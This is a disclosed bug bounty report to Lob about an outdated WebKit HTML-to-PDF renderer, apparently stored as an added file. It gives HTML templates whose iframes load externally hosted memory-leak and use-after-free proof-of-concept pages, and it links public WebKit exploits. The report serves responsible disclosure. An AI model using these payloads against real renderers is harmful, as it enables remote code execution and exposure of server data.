@@ -1,0 +1,67 @@
+ReportLink:https://hackerone.com/reports/520717
+WeaknessName:Use After Free
+Reporter:https://hackerone.com/ajxchapman
+ReportedTo:Lob(lob)
+BountyAmount:1500.0
+Severity:critical
+State:Closed
+DateOfDisclosure:23.04.2019 20:37:09
+
+Summary:
+
+## Summary:
+The Template Preview function allows users to render arbitrary HTML to a PDF document, this includes the ability to execute arbitrary Javascript. The HTML agent used to render the HTML is based on an old version of WebKit which has known security issues, for which public exploits and Proof of Concepts (PoCs) are available. Exploitation of these issues could lead to Remote Code Execution (RCE) on the AWS instance running the HTML renderer, potentially exposing sensitive user or configuration data.
+
+## Details:
+The WebKit agent version appears to date from ~2013 based on version numbers and feature availability. This version has multiple known vulnerabilities for which many public exploits are available.
+
+Specifically, the following resources demonstrate exploiting a memory leak and a Use after Free (UaF) issue to gain Remote Code Execution in a vulnerable WebKit version:
+* https://github.com/Cryptogenic/PS4-5.05-Kernel-Exploit/blob/master/expl.js
+* https://github.com/AlexAltea/orbital/blob/master/tools/dumper/exploit/500/index.html
+
+These exploits are targeted at a different version and system (PlayStation 4) so do not directly result in RCE on against the Template Preview WebKit agent. However, the techniques they use can be translated to target the WebKit agent used. 
+
+I have translated the two key exploit techniques used in the above exploits to target the Template Preview agent (see `Steps to Reproduce`). The first PoC I have produced exploits the memory leak to disclose internal process heap memory pointers. The second PoC demonstrates the UaF issue by completely crashing the Template Preview WebKit agent.
+
+It should be noted at this point I have not invested the time to fully translate these exploits to gain RCE on Template Preview WebKit agent. Based on the results observed, successfully exploiting the memory leak and UaF, it would just be a matter of effort to achieve this.
+
+## Steps To Reproduce:
+
+To demonstrate the identified memory leak issue create a new HTML Template with the following contents:
+```html
+<html>
+<body>
+  <iframe style="width: 100%; min-height: 20000px;" src="http://www.webhooks.pw/static/pocs/78d20a750cd8c80697746e60cfde103773ea1c02/leak.html"></iframe>
+</body>
+</html>
+```
+
+To demonstrate the identified Use after Free issue create a new HTML Template with the following contents:
+```html
+<html>
+<body>
+  <iframe style="width: 100%; min-height: 20000px;" src="http://www.webhooks.pw/static/pocs/78d20a750cd8c80697746e60cfde103773ea1c02/crash.html"></iframe>
+</body>
+</html>
+```
+
+Once the template is created, preview the template using the `Preview` function. This will cause the backend WebKit agent to render the given HTML page hosted at `http://www.webhooks.pw/static/pocs/78d20a750cd8c80697746e60cfde103773ea1c02/`. 
+
+`leak.html` exploits the memory leak vulnerability to extract a 64bit pointer into the process heap where JSObjects are created. The screenshots below show the output of two separate runs of this template:
+{F459846} {F459847}
+In these screenshots you can clearly see that the memory location leaked changes, this is due to the ASLR memory randomisation application to the process when it is started. Each time this template is previewed the pointer disclosed will be slightly different due to ASLR. The full PDF files are available as attachments {F459840} and {F459839}
+
+`crash.html` demonstrates the Use after Free vulnerability by crashing the WebKit renderer. The screenshot below details the error displayed to the user when this template is rendered, indicating that the WebKit agent crashed without producing any output:
+{F459843}
+
+## Supporting Material/References:
+
+Attachments {F459840} and {F459839} show the output of two separate runs of this template. In these generated PDF files you can clearly see that the memory location leaked changes, this is due to the ASLR memory randomisation application to the process when it is started.
+
+Addition resources detailing the specific vulnerabilities targeted in this report:
+* https://bugs.chromium.org/p/project-zero/issues/detail?id=1187
+* https://github.com/Cryptogenic/Exploit-Writeups/blob/master/WebKit/setAttributeNodeNS%20UAF%20Write-up.md
+
+## Impact
+
+Exploitation of this issue could lead to Remote Code Execution on the AWS instance running the HTML renderer, potentially exposing sensitive user or configuration data.
